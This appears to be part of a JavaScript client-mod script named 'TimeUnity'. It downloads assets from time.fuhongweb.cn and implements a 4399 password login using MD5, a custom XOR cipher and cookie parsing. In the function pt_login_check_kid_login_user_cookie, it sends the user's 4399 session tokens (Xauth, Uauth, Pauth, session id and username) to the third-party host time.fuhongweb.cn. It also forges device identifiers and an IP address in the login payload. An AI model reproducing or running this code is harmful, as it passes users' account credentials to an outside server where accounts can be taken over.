                path: "TimeUnity/Sound/攻击音效.mp3"
            },
            {
                url: "http://time.fuhongweb.cn/文件/击杀音效.mp3",
                path: "TimeUnity/Sound/击杀音效.mp3"
            },
            {
                url: "http://time.fuhongweb.cn/文件/词库.txt",
                path: "TimeUnity/词库.txt"
            },
            {
                url: "http://time.fuhongweb.cn/文件/FtConfig.json",
                path: "TimeUnity/FtConfig.json"
            },
            {
                url: "http://time.fuhongweb.cn/文件/开启音效.mp3",
                path: "sounds/TimeUnity/开启音效.mp3"
            },
            {
                url: "http://time.fuhongweb.cn/文件/关闭音效.mp3",
                path: "sounds/TimeUnity/关闭音效.mp3"
            }
        ];
        let WaitCount = 0;
        let DownloadCount = 0;
        let DownloadTip = false;
        for (let i = 0; i < Files.length;) {
            WaitCount++;
            if (WaitCount >= 20) {
                WaitCount = 0;
                const Filez = Files[i++];
                const FilePath = _app.getResource() + "/" + Filez.path;
                const DirPath = FilePath.substring(0, FilePath.lastIndexOf("/"));
                if (!_fs.exists(DirPath)) _fs.createDirectories(DirPath);
                if (!_fs.exists(FilePath)) {
                    if (!DownloadTip) {
                        _app.showToast("检测到首次加载，初始化中...");
                        DownloadTip = true;
                    }
                    _https.get(Filez.url, {}, (code, data) => {
                        if (code === 200) {
                            const Extension = Filez.path.split('.').pop().toLowerCase();
                            if (Extension === 'png' || Extension === 'mp3' || Extension === 'mp4') {
                                _fs.write(FilePath, data);
                            } else {
                                _fs.write(FilePath, data);
                            }
                        } else {
                            _app.showToast("下载失败: " + Filez.path.split("/").pop());
                        }
                        DownloadCount++;
                        if (DownloadCount === Files.length) {
                            TU_UI();
                        }
                    });
                } else {
                    DownloadCount++;
                    if (DownloadCount === Files.length) {
                        TU_UI();
                        return;
                    }
                }
            }
        }
    } catch (e) {
        _minecraft.clientMessage(`§c${e.stack}`);
    }
}
DownloadRes();

function md5(string) {
    function rotateLeft(lValue, iShiftBits) {
        return (lValue << iShiftBits) | (lValue >>> (32 - iShiftBits))
    }

    function addUnsigned(lX, lY) {
        var lX4, lY4, lX8, lY8, lResult;
        lX8 = (lX & 0x80000000);
        lY8 = (lY & 0x80000000);
        lX4 = (lX & 0x40000000);
        lY4 = (lY & 0x40000000);
        lResult = (lX & 0x3FFFFFFF) + (lY & 0x3FFFFFFF);
        if (lX4 & lY4) {
            return (lResult ^ 0x80000000 ^ lX8 ^ lY8)
        }
        if (lX4 | lY4) {
            if (lResult & 0x40000000) {
                return (lResult ^ 0xC0000000 ^ lX8 ^ lY8)
            } else {
                return (lResult ^ 0x40000000 ^ lX8 ^ lY8)
            }
        } else {
            return (lResult ^ lX8 ^ lY8)
        }
    }

    function F(x, y, z) {
        return (x & y) | ((~x) & z)
    }

    function G(x, y, z) {
        return (x & z) | (y & (~z))
    }

    function H(x, y, z) {
        return x ^ y ^ z
    }

    function I(x, y, z) {
        return y ^ (x | (~z))
    }

    function FF(a, b, c, d, x, s, ac) {
        a = addUnsigned(a, addUnsigned(addUnsigned(F(b, c, d), x), ac));
        return addUnsigned(rotateLeft(a, s), b)
    }

    function GG(a, b, c, d, x, s, ac) {
        a = addUnsigned(a, addUnsigned(addUnsigned(G(b, c, d), x), ac));
        return addUnsigned(rotateLeft(a, s), b)
    }

    function HH(a, b, c, d, x, s, ac) {
        a = addUnsigned(a, addUnsigned(addUnsigned(H(b, c, d), x), ac));
        return addUnsigned(rotateLeft(a, s), b)
    }

    function II(a, b, c, d, x, s, ac) {
        a = addUnsigned(a, addUnsigned(addUnsigned(I(b, c, d), x), ac));
        return addUnsigned(rotateLeft(a, s), b)
    }

    function utf8Encode(string) {
        string = string.replace(/\r\n/g, "\n");
        var utftext = "";
        for (var n = 0; n < string.length; n++) {
            var c = string.charCodeAt(n);
            if (c < 128) {
                utftext += String.fromCharCode(c)
            } else if ((c > 127) && (c < 2048)) {
                utftext += String.fromCharCode((c >> 6) | 192);
                utftext += String.fromCharCode((c & 63) | 128)
            } else {
                utftext += String.fromCharCode((c >> 12) | 224);
                utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                utftext += String.fromCharCode((c & 63) | 128)
            }
        }
        return utftext
    }
    var x = [];
    var k, AA, BB, CC, DD, a, b, c, d;
    var S11 = 7,
        S12 = 12,
        S13 = 17,
        S14 = 22;
    var S21 = 5,
        S22 = 9,
        S23 = 14,
        S24 = 20;
    var S31 = 4,
        S32 = 11,
        S33 = 16,
        S34 = 23;
    var S41 = 6,
        S42 = 10,
        S43 = 15,
        S44 = 21;
    string = utf8Encode(string);
    x = convertToWordArray(string);
    a = 0x67452301;
    b = 0xEFCDAB89;
    c = 0x98BADCFE;
    d = 0x10325476;
    for (k = 0; k < x.length; k += 16) {
        AA = a;
        BB = b;
        CC = c;
        DD = d;
        a = FF(a, b, c, d, x[k + 0], S11, 0xD76AA478);
        d = FF(d, a, b, c, x[k + 1], S12, 0xE8C7B756);
        c = FF(c, d, a, b, x[k + 2], S13, 0x242070DB);
        b = FF(b, c, d, a, x[k + 3], S14, 0xC1BDCEEE);
        a = FF(a, b, c, d, x[k + 4], S11, 0xF57C0FAF);
        d = FF(d, a, b, c, x[k + 5], S12, 0x4787C62A);
        c = FF(c, d, a, b, x[k + 6], S13, 0xA8304613);
        b = FF(b, c, d, a, x[k + 7], S14, 0xFD469501);
        a = FF(a, b, c, d, x[k + 8], S11, 0x698098D8);
        d = FF(d, a, b, c, x[k + 9], S12, 0x8B44F7AF);
        c = FF(c, d, a, b, x[k + 10], S13, 0xFFFF5BB1);
        b = FF(b, c, d, a, x[k + 11], S14, 0x895CD7BE);
        a = FF(a, b, c, d, x[k + 12], S11, 0x6B901122);
        d = FF(d, a, b, c, x[k + 13], S12, 0xFD987193);
        c = FF(c, d, a, b, x[k + 14], S13, 0xA679438E);
        b = FF(b, c, d, a, x[k + 15], S14, 0x49B40821);
        a = GG(a, b, c, d, x[k + 1], S21, 0xF61E2562);
        d = GG(d, a, b, c, x[k + 6], S22, 0xC040B340);
        c = GG(c, d, a, b, x[k + 11], S23, 0x265E5A51);
        b = GG(b, c, d, a, x[k + 0], S24, 0xE9B6C7AA);
        a = GG(a, b, c, d, x[k + 5], S21, 0xD62F105D);
        d = GG(d, a, b, c, x[k + 10], S22, 0x2441453);
        c = GG(c, d, a, b, x[k + 15], S23, 0xD8A1E681);
        b = GG(b, c, d, a, x[k + 4], S24, 0xE7D3FBC8);
        a = GG(a, b, c, d, x[k + 9], S21, 0x21E1CDE6);
        d = GG(d, a, b, c, x[k + 14], S22, 0xC33707D6);
        c = GG(c, d, a, b, x[k + 3], S23, 0xF4D50D87);
        b = GG(b, c, d, a, x[k + 8], S24, 0x455A14ED);
        a = GG(a, b, c, d, x[k + 13], S21, 0xA9E3E905);
        d = GG(d, a, b, c, x[k + 2], S22, 0xFCEFA3F8);
        c = GG(c, d, a, b, x[k + 7], S23, 0x676F02D9);
        b = GG(b, c, d, a, x[k + 12], S24, 0x8D2A4C8A);
        a = HH(a, b, c, d, x[k + 5], S31, 0xFFFA3942);
        d = HH(d, a, b, c, x[k + 8], S32, 0x8771F681);
        c = HH(c, d, a, b, x[k + 11], S33, 0x6D9D6122);
        b = HH(b, c, d, a, x[k + 14], S34, 0xFDE5380C);
        a = HH(a, b, c, d, x[k + 1], S31, 0xA4BEEA44);
        d = HH(d, a, b, c, x[k + 4], S32, 0x4BDECFA9);
        c = HH(c, d, a, b, x[k + 7], S33, 0xF6BB4B60);
        b = HH(b, c, d, a, x[k + 10], S34, 0xBEBFBC70);
        a = HH(a, b, c, d, x[k + 13], S31, 0x289B7EC6);
        d = HH(d, a, b, c, x[k + 0], S32, 0xEAA127FA);
        c = HH(c, d, a, b, x[k + 3], S33, 0xD4EF3085);
        b = HH(b, c, d, a, x[k + 6], S34, 0x4881D05);
        a = HH(a, b, c, d, x[k + 9], S31, 0xD9D4D039);
        d = HH(d, a, b, c, x[k + 12], S32, 0xE6DB99E5);
        c = HH(c, d, a, b, x[k + 15], S33, 0x1FA27CF8);
        b = HH(b, c, d, a, x[k + 2], S34, 0xC4AC5665);
        a = II(a, b, c, d, x[k + 0], S41, 0xF4292244);
        d = II(d, a, b, c, x[k + 7], S42, 0x432AFF97);
        c = II(c, d, a, b, x[k + 14], S43, 0xAB9423A7);
        b = II(b, c, d, a, x[k + 5], S44, 0xFC93A039);
        a = II(a, b, c, d, x[k + 12], S41, 0x655B59C3);
        d = II(d, a, b, c, x[k + 3], S42, 0x8F0CCC92);
        c = II(c, d, a, b, x[k + 10], S43, 0xFFEFF47D);
        b = II(b, c, d, a, x[k + 1], S44, 0x85845DD1);
        a = II(a, b, c, d, x[k + 8], S41, 0x6FA87E4F);
        d = II(d, a, b, c, x[k + 15], S42, 0xFE2CE6E0);
        c = II(c, d, a, b, x[k + 6], S43, 0xA3014314);
        b = II(b, c, d, a, x[k + 13], S44, 0x4E0811A1);
        a = II(a, b, c, d, x[k + 4], S41, 0xF7537E82);
        d = II(d, a, b, c, x[k + 11], S42, 0xBD3AF235);
        c = II(c, d, a, b, x[k + 2], S43, 0x2AD7D2BB);
        b = II(b, c, d, a, x[k + 9], S44, 0xEB86D391);
        a = addUnsigned(a, AA);
        b = addUnsigned(b, BB);
        c = addUnsigned(c, CC);
        d = addUnsigned(d, DD)
    }
    var temp = wordToHex(a) + wordToHex(b) + wordToHex(c) + wordToHex(d);
    return temp.toLowerCase()
}

function convertToWordArray(string) {
    var lWordCount;
    var lMessageLength = string.length;
    var lNumberOfWords_temp1 = lMessageLength + 8;
    var lNumberOfWords_temp2 = (lNumberOfWords_temp1 - (lNumberOfWords_temp1 % 64)) / 64;
    var lNumberOfWords = (lNumberOfWords_temp2 + 1) * 16;
    var lWordArray = Array(lNumberOfWords - 1);
    var lBytePosition = 0;
    var lByteCount = 0;
    while (lByteCount < lMessageLength) {
        lWordCount = (lByteCount - (lByteCount % 4)) / 4;
        lBytePosition = (lByteCount % 4) * 8;
        lWordArray[lWordCount] = (lWordArray[lWordCount] | (string.charCodeAt(lByteCount) << lBytePosition));
        lByteCount++
    }
    lWordCount = (lByteCount - (lByteCount % 4)) / 4;
    lBytePosition = (lByteCount % 4) * 8;
    lWordArray[lWordCount] = lWordArray[lWordCount] | (0x80 << lBytePosition);
    lWordArray[lNumberOfWords - 2] = lMessageLength << 3;
    lWordArray[lNumberOfWords - 1] = lMessageLength >>> 29;
    return lWordArray
}

function wordToHex(lValue) {
    var WordToHexValue = "",
        WordToHexValue_temp = "",
        lByte, lCount;
    for (lCount = 0; lCount <= 3; lCount++) {
        lByte = (lValue >>> (lCount * 8)) & 255;
        WordToHexValue_temp = "0" + lByte.toString(16);
        WordToHexValue = WordToHexValue + WordToHexValue_temp.substr(WordToHexValue_temp.length - 2, 2)
    }
    return WordToHexValue
}

function strToUtf8Bytes(str) {
    const utf8 = [];
    for (let i = 0; i < str.length; i++) {
        let charCode = str.charCodeAt(i);
        if (charCode < 0x80) {
            utf8.push(charCode);
        } else if (charCode < 0x800) {
            utf8.push(0xc0 | (charCode >> 6));
            utf8.push(0x80 | (charCode & 0x3f));
        } else if (charCode < 0xd800 || charCode >= 0xe000) {
            utf8.push(0xe0 | (charCode >> 12));
            utf8.push(0x80 | ((charCode >> 6) & 0x3f));
            utf8.push(0x80 | (charCode & 0x3f));
        } else {
            i++;
            const code = 0x10000 + ((charCode & 0x03ff) << 10) | (str.charCodeAt(i) & 0x03ff);
            utf8.push(0xf0 | (code >> 18));
            utf8.push(0x80 | ((code >> 12) & 0x3f));
            utf8.push(0x80 | ((code >> 6) & 0x3f));
            utf8.push(0x80 | (code & 0x3f));
        }
    }
    return new Uint8Array(utf8);
}

function utf8BytesToStr(bytes) {
    let str = '';
    let i = 0;
    while (i < bytes.length) {
        const byte = bytes[i];
        if (byte < 0x80) {
            str += String.fromCharCode(byte);
            i++;
        } else if (byte >= 0xc0 && byte < 0xe0) {
            str += String.fromCharCode(((byte & 0x1f) << 6) | (bytes[i + 1] & 0x3f));
            i += 2;
        } else if (byte >= 0xe0 && byte < 0xf0) {
            str += String.fromCharCode(((byte & 0x0f) << 12) | ((bytes[i + 1] & 0x3f) << 6) | (bytes[i + 2] & 0x3f));
            i += 3;
        } else if (byte >= 0xf0) {
            const code = ((byte & 0x07) << 18) | ((bytes[i + 1] & 0x3f) << 12) | ((bytes[i + 2] & 0x3f) << 6) | (bytes[i + 3] & 0x3f);
            str += String.fromCharCode(0xd800 + ((code - 0x10000) >> 10), 0xdc00 + ((code - 0x10000) & 0x3ff));
            i += 4;
        } else {
            i++;
        }
    }
    return str;
}

function XorEncrypt(text, key) {
    const textBytes = strToUtf8Bytes(text);
    const keyBytes = strToUtf8Bytes(key);
    const res = new Uint8Array(textBytes.length);
    for (let i = 0; i < textBytes.length; i++) {
        const k = keyBytes[i % keyBytes.length];
        let c = textBytes[i] ^ k;
        c = c ^ ((i * 37) & 255);
        const shift = (i % 3) + 1;
        c = ((c << shift) | (c >>> (8 - shift))) & 255;
        res[i] = c;
    }
    return base64Encode(res);
}

function XorDecrypt(encrypted, key) {
    const encryptedBytes = base64Decode(encrypted);
    const keyBytes = strToUtf8Bytes(key);
    const res = new Uint8Array(encryptedBytes.length);
    for (let i = 0; i < encryptedBytes.length; i++) {
        let c = encryptedBytes[i];
        const shift = (i % 3) + 1;
        c = ((c >>> shift) | (c << (8 - shift))) & 255;
        c = c ^ ((i * 37) & 255);
        const k = keyBytes[i % keyBytes.length];
        c = c ^ k;
        res[i] = c;
    }
    return utf8BytesToStr(res);
}

function base64Encode(bytes) {
    const c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    let r = '';
    for (let i = 0; i < bytes.length; i += 3) {
        const a = bytes[i] || 0;
        const b = bytes[i + 1] || 0;
        const cc = bytes[i + 2] || 0;
        const n = (a << 16) | (b << 8) | cc;
        r += c.charAt((n >> 18) & 63) + c.charAt((n >> 12) & 63) + (i + 1 < bytes.length ? c.charAt((n >> 6) & 63) : '=') + (i + 2 < bytes.length ? c.charAt(n & 63) : '=');
    }
    return r;
}

function base64Decode(s) {
    const c = {
        'A': 0,
        'B': 1,
        'C': 2,
        'D': 3,
        'E': 4,
        'F': 5,
        'G': 6,
        'H': 7,
        'I': 8,
        'J': 9,
        'K': 10,
        'L': 11,
        'M': 12,
        'N': 13,
        'O': 14,
        'P': 15,
        'Q': 16,
        'R': 17,
        'S': 18,
        'T': 19,
        'U': 20,
        'V': 21,
        'W': 22,
        'X': 23,
        'Y': 24,
        'Z': 25,
        'a': 26,
        'b': 27,
        'c': 28,
        'd': 29,
        'e': 30,
        'f': 31,
        'g': 32,
        'h': 33,
        'i': 34,
        'j': 35,
        'k': 36,
        'l': 37,
        'm': 38,
        'n': 39,
        'o': 40,
        'p': 41,
        'q': 42,
        'r': 43,
        's': 44,
        't': 45,
        'u': 46,
        'v': 47,
        'w': 48,
        'x': 49,
        'y': 50,
        'z': 51,
        '0': 52,
        '1': 53,
        '2': 54,
        '3': 55,
        '4': 56,
        '5': 57,
        '6': 58,
        '7': 59,
        '8': 60,
        '9': 61,
        '+': 62,
        '/': 63
    };
    s = s.replace(/[^A-Za-z0-9\+\/]/g, '');
    let pad = 0;
    if (s.endsWith('==')) pad = 2;
    else if (s.endsWith('=')) pad = 1;
    s = s.replace(/=+$/, '');
    const bytes = new Uint8Array((s.length * 3) / 4);
    let bytePos = 0;
    for (let i = 0; i < s.length; i += 4) {
        const a = c[s[i]] || 0;
        const b = c[s[i + 1]] || 0;
        const cc = c[s[i + 2]] || 0;
        const d = c[s[i + 3]] || 0;
        const n = (a << 18) | (b << 12) | (cc << 6) | d;
        bytes[bytePos++] = (n >> 16) & 255;
        if (bytePos < bytes.length) bytes[bytePos++] = (n >> 8) & 255;
        if (bytePos < bytes.length) bytes[bytePos++] = n & 255;
    }
    return bytes.subarray(0, bytes.length - pad);
}

function generateRandomString(length, chars = '0123456789abcdef') {
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function normalizeSetCookieHeaders(cookieHeaders) {
    if (Array.isArray(cookieHeaders)) {
        return cookieHeaders;
    }
    if (typeof cookieHeaders === 'string') {
        try {
            return JSON.parse(cookieHeaders);
        } catch (e) {
            if (cookieHeaders.includes('Expires=') && cookieHeaders.includes('Path=')) {
                return cookieHeaders.split(/\s*,\s*(?=\w+=)/).filter(item => item.trim());
            } else if (cookieHeaders.includes(',')) {
                return cookieHeaders.split(',').map(item => item.trim()).filter(item => item);
            } else {
                return [cookieHeaders];
            }
        }
    }
    return [cookieHeaders];
}

function makeRequest(method, url, headers = {}, data = null) {
    return new Promise((resolve, reject) => {
        const callback = function(code, response, responseHeaders) {
            if (code >= 200 && code < 400) {
                const cookies = {};
                if (responseHeaders['Set-Cookie']) {
                    let cookieHeaders = responseHeaders['Set-Cookie'];
                    const cookieArray = normalizeSetCookieHeaders(cookieHeaders);
                    cookieArray.forEach(cookie => {
                        const cookiePart = cookie.split(';')[0];
                        const equalsIndex = cookiePart.indexOf('=');
                        if (equalsIndex > 0) {
                            const name = cookiePart.substring(0, equalsIndex).trim();
                            const value = cookiePart.substring(equalsIndex + 1).trim();
                            cookies[name] = value;
                        }
                    });
                }
                resolve({
                    status: code,
                    headers: responseHeaders,
                    data: response,
                    cookies: cookies
                });
            } else {
                reject(new Error(`Request failed with status code: ${code}`));
            }
        };
        if (method === 'GET') {
            _https.get(url, headers, callback);
        } else if (method === 'POST') {
            let postData = data;
            if (data && typeof data === 'object') {
                postData = Object.entries(data)
                    .map(([k, v]) => encodeURIComponent(k) + '=' + encodeURIComponent(v))
                    .join('&');

                if (!headers['Content-Type']) {
                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
                }
            }
            _https.post(url, headers, postData || '', callback);
        } else {
            reject(new Error(`Unsupported method: ${method}`));
        }
    });
}

function encodeCookie(cookies) {
    return Object.entries(cookies)
        .map(([k, v]) => k + '=' + v)
        .join('; ');
}

async function initLoginSession(username, phlogact) {
    const initUrl = "http://ptlogin.4399.com/ptlogin/loginFrame.do?postLoginHandler=default&displayMode=popup&css=http://microgame.5054399.net/v2/resource/cssSdk/default/login.css&bizId=2201001794&appId=kid_wdsj&username=" + username.toLowerCase() + "&externalLogin=qq&mainDivId=popup_login_div&autoLogin=false&includeFcmInfo=false&qrLogin=true&userNameLabel=4399&userNameTip=4399&welcomeTip=4399&level=8&regLevel=8&iframeId=popup_login_frame&v=" + Date.now();
    const initHeaders = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "keep-alive",
        "Host": "ptlogin.4399.com",
        "Referer": "http://ptlogin.4399.com/resource/ucenter.html",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    };
    try {
        const response = await makeRequest('GET', initUrl, initHeaders);
        return response.cookies;
    } catch (error) {
        return {};
    }
}

function buildQueryString(params) {
    return Object.keys(params)
        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(params[key]))
        .join('&');
}

async function pt_login_check_kid_login_user_cookie(pnick, qnick, xauth, username, phlogact, session_id, uauth, pauth) {
    const cookies = {
        "ptusertype": "kid_wdsj.4399_login",
        "Pnick": pnick,
        "Qnick": qnick || "",
        "Xauth": xauth,
        "Puser": username.toLowerCase(),
        "phlogact": phlogact,
        "USESSIONID": session_id,
        "Uauth": uauth,
        "Pauth": pauth,
        "ck_accname": username.toLowerCase()
    };
    const rand_time = uauth.split("|")[4] || Math.floor(Date.now() / 1000).toString();
    const params = buildQueryString({
        "appId": "kid_wdsj",
        "gameUrl": "http://cdn.h5wan.4399sj.com/microterminal-h5-frame?game_id=500352",
        "rand_time": rand_time,
        "nick": encodeURIComponent(pnick),
        "onLineStart": "false",
        "show": "1",
        "isCrossDomain": "1",
        "retUrl": "http://ptlogin.4399.com/resource/ucenter.html",
        "v": Date.now().toString()
    });
    const url = "http://time.fuhongweb.cn/checkKidLoginUserCookie.php?" + params.toString();
    const headers = {
        "Cookie": encodeCookie(cookies)
    };
    try {
        const response = await new Promise((resolve, reject) => {
            _https.get(url, headers, function(code, data, headers) {
                if (code === 200) {
                    resolve(data);
                }
            });
        });
        return JSON.parse(response);
    } catch (error) {
        throw error;
    }
}

async function sdk_info(location) {
    if (!location) {
        throw new Error('Location is empty');
    }
    let queryStr = '';
    const questionMarkIndex = location.indexOf('?');
    if (questionMarkIndex !== -1) {
        queryStr = location.substring(questionMarkIndex + 1);
    }
    const params = buildQueryString({
        "callback": "",
        "queryStr": queryStr,
        "_": Date.now().toString()
    });
    const url = "https://microgame.5054399.net/v2/service/sdk/info?" + params;
    const headers = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "keep-alive",
        "Host": "microgame.5054399.net",
        "Referer": location,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    };
    try {
        const response = await makeRequest('GET', url, headers);
        if (response.status === 200 && response.data) {
            let jsonData;
            try {
                jsonData = JSON.parse(response.data);
            } catch (e) {
                const match = response.data.match(/^\w+\((.*)\)$/);
                if (match) {
                    jsonData = JSON.parse(match[1]);
                } else {
                    throw new Error('Parse JSON failed');
                }
            }
            return jsonData;
        }
        throw new Error('Request failed: ' + response.status);
    } catch (error) {
        throw error;
    }
}

function parseLoginResponse(responseData) {
    if (responseData.includes('Xauth=')) {
        const xauthMatch = responseData.match(/Xauth=([^;]+)/);
        const uauthMatch = responseData.match(/Uauth=([^;]+)/);
        const pauthMatch = responseData.match(/Pauth=([^;]+)/);
        const pnickMatch = responseData.match(/Pnick=([^;]+)/);
        const qnickMatch = responseData.match(/Qnick=([^;]+)/);
        const result = {
            Xauth: xauthMatch ? decodeURIComponent(xauthMatch[1]) : null,
            Uauth: uauthMatch ? decodeURIComponent(uauthMatch[1]) : null,
            Pauth: pauthMatch ? decodeURIComponent(pauthMatch[1]) : null,
            Pnick: pnickMatch ? decodeURIComponent(pnickMatch[1]) : null,
            Qnick: qnickMatch ? decodeURIComponent(qnickMatch[1]) : null
        };
        return result;
    }
    if (responseData.includes('"message"')) {
        try {
            const jsonResponse = JSON.parse(responseData);
            if (jsonResponse.message) {
                throw new Error('Login failed: ' + jsonResponse.message);
            }
        } catch (e) {}
    }
    return null;
}

async function pt_login_do(username, phlogact, password, session_id, initCookies = {}) {
    const url = "http://ptlogin.4399.com/ptlogin/login.do";
    const baseCookies = {
        "ptusertype": "kid_wdsj.4399_login",
        "Pnick": "0",
        "Qnick": "",
        "Puser": username.toLowerCase(),
        "phlogact": phlogact,
        "USESSIONID": session_id
    };
    const cookies = {
        ...baseCookies,
        ...initCookies
    };
    const headers = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "ptlogin.4399.com",
        "Origin": "http://ptlogin.4399.com",
        "Referer": "http://ptlogin.4399.com/ptlogin/loginFrame.do",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Cookie": encodeCookie(cookies)
    };
    const postData = {
        "v": "1",
        "loginFrom": "uframe",
        "postLoginHandler": "default",
        "layoutSelfAdapting": "true",
        "externalLogin": "qq",
        "displayMode": "popup",
        "layout": "vertical",
        "bizId": "2201001794",
        "appId": "kid_wdsj",
        "gameId": "wd",
        "css": "http://microgame.5054399.net/v2/resource/cssSdk/default/login.css",
        "mainDivId": "popup_login_div",
        "includeFcmInfo": "false",
        "level": "8",
        "regLevel": "8",
        "userNameLabel": "4399",
        "userNameTip": "4399",
        "welcomeTip": "4399",
        "sec": "1",
        "password": password,
        "iframeId": "popup_login_frame",
        "username": username.toLowerCase()
    };
    try {
        const response = await makeRequest('POST', url, headers, postData);
        const allCookies = {
            ...cookies,
            ...response.cookies
        };
        return {
            status: response.status,
            headers: response.headers,
            data: response.data,
            cookies: allCookies
        };
    } catch (error) {
        throw error;
    }
}

async function LoginBy4399Password(username, password, phlogact) {
    const session_id = generateUUID();
    const initCookies = await initLoginSession(username, phlogact);
    const loginResult = await pt_login_do(username, phlogact, password, session_id, initCookies);
    if (loginResult.status !== 200) {
        throw new Error('Login failed: ' + loginResult.status);
    }
    const parsedCookies = parseLoginResponse(loginResult.data);
    const cookies = {
        ...loginResult.cookies
    };
    if (!cookies['Xauth'] && parsedCookies && parsedCookies.Xauth) {
        cookies['Xauth'] = parsedCookies.Xauth;
        cookies['Uauth'] = parsedCookies.Uauth;
        cookies['Pauth'] = parsedCookies.Pauth;
        cookies['Pnick'] = parsedCookies.Pnick || username.toLowerCase();
    }
    const required = ['Pnick', 'Xauth', 'Uauth', 'Pauth'];
    const missingCookies = required.filter(cookie => !cookies[cookie]);
    if (missingCookies.length > 0) {
        throw new Error('用户名不存在或密码错误');
    }
    const checkResult = await pt_login_check_kid_login_user_cookie(
        cookies['Pnick'],
        cookies['Qnick'] || '',
        cookies['Xauth'],
        username,
        phlogact,
        session_id,
        cookies['Uauth'],
        cookies['Pauth']
    );
    if (checkResult.status !== 302 && checkResult.status !== 200) {
        throw new Error('Check failed: ' + checkResult.status);
    }
    const location = checkResult.headers['Location'];
    if (!location) {
        throw new Error('No location header');
    }
    const sdkInfo = await sdk_info(location);
    if (!sdkInfo || !sdkInfo.data || !sdkInfo.data.sdk_login_data) {
        throw new Error('SDK data missing');
    }
    const sdkLoginData = {};
    sdkInfo.data.sdk_login_data.split('&').forEach(pair => {
        const [key, value] = pair.split('=');
        if (key && value) sdkLoginData[key] = value;
    });
    const sauthJson = {
        timestamp: sdkLoginData['time'],
        userid: sdkLoginData['username'],
        realname: JSON.stringify({
            realname_type: "0"
        }),
        gameid: "x19",
        login_channel: "4399pc",
        app_channel: "4399pc",
        platform: "pc",
        sdkuid: sdkLoginData['uid'],
        sessionid: sdkLoginData['token'],
        sdk_version: "1.0.0",
        udid: generateRandomString(32, '0123456789abcdef'),
        deviceid: generateRandomString(32, '0123456789ABCDEF'),
        aim_info: JSON.stringify({
            aim: "127.0.0.1",
            country: "CN",
            tz: "+0800",
            tzid: ""
        }),
        client_login_sn: generateUUID().replace(/-/g, ''),
        gas_token: "",
        source_platform: "pc",
        ip: "127.0.0.1"
    };
    const finalResult = {
        sauth_json: JSON.stringify(sauthJson)
    };
    return JSON.stringify(finalResult);
}